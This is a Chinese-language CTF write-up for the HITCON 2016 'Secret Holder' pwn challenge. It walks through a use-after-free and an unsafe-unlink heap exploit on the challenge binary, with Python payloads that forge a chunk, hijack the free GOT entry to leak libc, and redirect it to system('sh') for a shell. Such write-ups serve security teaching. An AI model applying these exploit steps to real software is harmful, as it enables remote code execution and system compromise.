#[Hitcon CTF 2016] Secret Holder 100

> Category: pwn		
> point: 100

這題是看了 **bruce 學長** 的思路才解出來的。除了考 unlink 的 vuln 之外還有一個 trick，雖然我還是不知道為啥QQ

64 bit ELF, NX, Partial RELRO, Stack Canary, no PIE

一開始會給三個選單：

1. Keep secret
2. Wipe secret
3. Renew secret

而這三個又可以分別選擇以下三種來進行操作：

1. small secret
2. big secret
3. huge secret

先來看看這幾個 func 在做什麼：

keep
----

~~~c
if(!buf_in_use){
	buf = calloc(1, size_of_kind);
	buf_in_use = 1;
	puts("Tell me your secret: ");
	read(0, buf, size_of_kind);
}
~~~

keep 會問你要保存什麼樣的秘密，接著檢查是不是已經分配過了，如果沒有則根據 small(40), big(4000), huge(400000)，不同選擇來分配大小，之後可以 read 進該 size 的長度的 payload。

global buffer 上有三個 address 來存放這些 malloc 得到的記憶體位置，分別稱它為 small_buf, big_buf, huge_buf，除了這些之外，global buffer上還有 3 個 4bytes 的 buffer，來記錄這幾種秘密是不是 inuse。

wipe
----

~~~c
free(buf);
buf_in_use = 0;
~~~

這兩行 code 就很一般的 `free` 掉空間然後 inuse 清成 0。但是很重要的是這裡不會檢查是不是 not in use，而直接 `free` 掉。再來是 `free` 掉之後也不會把 buf 清成 NULL，global buffer 上會依舊指著剛剛 `calloc()` 的 address。

renew
-----

~~~c
if(buf_in_use){
	puts("Tell me your secret: ");
	read(0, buf, size_of_kind);	
}
~~~

這裡就很簡單的可以重新讀東西進 buffer 裡。

攻擊手法：
---------

利用 unlink 來造成任意 address 的寫入。不過這邊需要知道一點：

keep huge -> wipe huge -> keep huge

huge 是 size 40w 的秘密，超過了 128 KB，第一次會由 mmap 來分配記憶體，但是第二次 keep huge 時，就會由 `malloc` 來分配。

根據學長的描述還有日文 write up 的翻譯，應該是因為 memory 被延伸過了，為了讓 memory 確保與其他 chunk 連續，所以會呼叫 `malloc` 而不是 mmap。這真的是  malloc.c 的 secret @@

利用特殊的順序來讓 small 跟 huge 指向同一塊記憶體：

1. keep huge
2. wipe huge
3. keep small
4. wipe small
5. keep huge  #此時 huge 跟 small 指向同一塊 memory

~~~assembly
0x6020a0:       0x0000000000000000      0x0000000000603010
0x6020b0:       0x0000000000603010      0x0000000100000000
0x6020c0:       0x0000000000000000      0x0000000000000000
0x6020d0:       0x0000000000000000      0x0000000000000000
0x6020e0:       0x0000000000000000      0x0000000000000000
~~~

因為 huge 可以寫入的長度很長，所以我們希望我們可以繼續對他做寫入來達到 heap overflow，我們保留他的 in use，接著利用 wipe small 來達到 free(small)->free(huge) 的意義。

再來是 keep small 來拿回原來的 `0x603010` 的 chunk，接著 keep big 就可以拿到接在 `0x603010` 下面的 chunk。我們就可以利用 renew huge 來達成 heap overflow 的效果。

6. wipe small
7. keep small
8. keep big
9. renew huge # overflow!!!

~~~assembly
0x6020a0:       0x0000000000603040      0x0000000000603010
0x6020b0:       0x0000000000603010      0x0000000100000001
0x6020c0:       0x0000000000000001      0x0000000000000000
0x6020d0:       0x0000000000000000      0x0000000000000000
0x6020e0:       0x0000000000000000      0x0000000000000000
~~~

接下來就要來利用 overflow 構造 fake chunk，原來的 chunk layout：

~~~assembly
0x603000:       0x0000000000000000      0x0000000000000031
0x603010:       0x0000000000000a62      0x0000000000000000
0x603020:       0x0000000000000000      0x0000000000000000
0x603030:       0x0000000000000000      0x0000000000000fb1
0x603040:       0x0000000000000a63      0x0000000000000000
0x603050:       0x0000000000000000      0x0000000000000000
~~~

因為我們只能從 `0x603010` 開始寫入，因此我們需要把 `0x603010` 當作 chunk 的開頭，先來看一下 `_int_free` 的實作，以下只列出幾個重點：

他會先利用 size 找到 nextchunk

~~~c
nextchunk = chunk_at_offset(p, size);
~~~

後面會從 nextchunk 檢查 previous inuse bit，也會拿 nextchunksize：

~~~c
if (__glibc_unlikely (!prev_inuse(nextchunk)))
{
	errstr = "double free or corruption (!prev)";
	goto errout;
}

nextsize = chunksize(nextchunk);
~~~

接下來會先進行 consolidate，而 consolidate 有 forward & backward，
他會先進行 backward，這裡的 backward 是會往高尋找(也就是 address 較小的地方)：

~~~c
/* consolidate backward */
if (!prev_inuse(p)) {
	prevsize = p->prev_size;
	size += prevsize;
	p = chunk_at_offset(p, -((long) prevsize));
	unlink(av, p, bck, fwd);
}
~~~

之後會先檢查 nextchunk 是不是 top chunk，如果不是則會進行 consolidate forward：

~~~c
if (nextchunk != av->top)
~~~

Unlink 的實作：

~~~c
#define unlink(P, BK, FD){
	FD = p->fd;
	BK = p->bk;
	FD->bk = BK;
	BK->fd = FD;
}
~~~

接著來看看 payload：

~~~python
fake_fd = 0x6020a8 - 0x18
fake_bk = 0x6020a8 - 0x10

payload = ""
payload += p64(0x0) # 0x603010 的 previous size 不是很重要給個 0
payload += p64(0x21) # 0x603010 的 size 
payload += p64(fake_fd) # fake 0x603010 的 fd
payload += p64(fake_bk) # fake 0x603010 的 bk

# 這裡已經到了 0x603040 也就是 big secret 的 chunk
payload += p64(0x20) # fake previous size 讓她往回找 previous chunk 可以找到 0x603010
payload += p64(0xfb0) # big secret chunk size 
~~~

renew 完 huge 送了以上 payload 來偽造 chunk 之後，call `wipe(big)`，他就會進行 unsafe unlink `0x603010`。

因為新版的 unlink 會檢查 FD->bk 會不會 = p，BK->fd 會不會 = p，所以 unlink 不能直接讓 GOT entry 接 shellcode。

unlink 完後，global buffer 的 layout 如下：

~~~assembly
0x602090:       0x00007ff7c9bae620      0x0000000000000000
0x6020a0:       0x00000000013b0040      0x0000000000602090
0x6020b0:       0x00000000013b0010      0x0000000100000000
0x6020c0:       0x0000000000000001
~~~
此時 huge_buf 會指到 global buffer 上，接下來再一次 renew huge 來讓這些 secret buffer 指到任意的 address。

payload：

~~~python
free_got = 0x602018
payload = ""
payload += 'A'*0x10 + p64(0x0) # padding
payload += p64(0x6020b0) # 讓 huge_buf 指到 small_buf 的 address
payload += p64(free_got) # 讓 small_buf 指到 GOT of free 來進行 GOT hijacking
~~~

接著 renew(small) 我們就可以把 `free` hijack 成 `puts`

~~~python
puts_got_value = 0x4006c6
payload = p64(puts_got_value)*2
~~~

這裡 *2 的目的是讓後面的 `puts` 不要壞掉

這時候我們再一次 renew(huge)，這時候就是 overwrite small_buf，我們讓他指到 `__libc_start_main` 的 GOT entry。

~~~python
libc_start_main_got = 0x602048
payload = p64(libc_start_main_got) + p32(1)*3
~~~

這裡的 `p32(1)` 是把 small big huge 的 inuse 設成 1。

接著呼叫 wipe(small) 會變成：

~~~
wipe(small) -> free(small) -> puts(small) -> puts(libc_start_main_got)
~~~

成功 leak libc function address。

這裡 libc 的版本是直接對比 babyheap 那題的 libc.so.6 是同一版本直接拿來用。

找到 libc base 之後，利用 renew(huge) 把 small_buf 在指回 free_got

~~~python
payload = p64(free_got) + p32(1)*3
~~~

之後 renew(small) 來把 free_got 再次 hijack：

~~~python
system = base + libc.symbols['system']
payload = p64(system) + p64(puts_got_value)
~~~

接著 renew(huge) 把 small_buf 指到 'sh\x00' 字串位置

~~~python
payload = p64(0x6020b8) + 'sh\x00'
~~~

改完後 global buffer：

~~~assembly
0x6020a0:       0x00000000013b0040      0x00000000006020b0
0x6020b0:       0x00000000006020b8      'sh\x00'
~~~
call wipe(small)：
~~~
wipe(small) -> free(small) -> system(small) -> system('sh')
~~~

就拿到 shell 了！
